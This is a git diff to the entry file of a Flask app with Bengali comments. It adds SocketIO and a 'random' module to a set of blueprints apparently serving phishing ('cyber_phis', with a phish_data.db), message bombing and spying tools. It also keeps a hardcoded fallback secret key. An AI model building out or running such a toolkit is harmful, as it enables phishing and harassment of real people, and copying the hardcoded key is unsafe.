@@ -2,6 +2,7 @@ from flask import Flask
 import importlib
 import os
 from cyber_phis import init_db   # ✅ ডেটাবেস তৈরির ফাংশন ইমপোর্ট
+from flask_socketio import SocketIO
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'fallback-secret-key-2026')   # ✅ সেশন সাপোর্টের জন্য
@@ -10,7 +11,7 @@ app.secret_key = os.environ.get('SECRET_KEY', 'fallback-secret-key-2026')   # �
 init_db()   # ✅ /tmp/phish_data.db তৈরি হবে
 
 # ========== ব্লুপ্রিন্ট লোড ==========
-files = ['hard_bomber', 'cyber_phis', 'cyber_spy', 'support', 'md_bot']
+files = ['hard_bomber', 'cyber_phis', 'cyber_spy', 'support', 'md_bot','random']
 for file in files:
     module = importlib.import_module(file)
     if hasattr(module, 'bp'):
@@ -19,7 +20,7 @@ for file in files:
 # ========== হোম ও পিং ==========
 @app.route('/')
 def home():
-    return {'status': 'online', 'tools': ['/hard_bomber', '/phis', '/spy', '/support', '/bot']}
+    return {'status': 'online', 'tools': ['/hard_bomber', '/phis', '/spy', '/support', '/bot', '/random']}
 
 @app.route('/ping')
 def ping():
